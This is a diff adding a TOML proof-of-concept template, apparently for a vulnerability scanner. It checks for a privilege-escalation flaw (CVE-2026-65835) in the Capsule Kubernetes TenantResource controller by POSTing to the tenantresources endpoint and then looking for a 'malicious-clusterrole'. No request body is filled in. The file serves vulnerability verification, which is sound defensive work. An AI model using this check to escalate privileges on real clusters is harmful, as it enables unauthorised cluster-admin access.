@@ -1,0 +1,45 @@
+[info]
+author = "ave"
+description = "验证Capsule TenantResource控制器未对RawItems/Generators路径做集群作用域资源拒绝检查，导致租户所有者可通过创建包含ClusterRole等集群作用域资源的TenantResource提权至集群管理员"
+id = "POC-AVE-2026-0936"
+name = "CVE-2026-65835 PoC"
+severity = "medium"
+tags = ["ave-2026-0936"]
+vuln_id = [
+    "CVE-2026-65835",
+    "AVE-2026-0936",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/apis/capsule.clastix.io/v1beta2/namespaces/tenant-ns/tenantresources"
+protocol = "http"
+
+[poc.requests.body]
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "201",
+    "Created",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/apis/rbac.authorization.k8s.io/v1/clusterroles/malicious-clusterrole"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["malicious-clusterrole"]
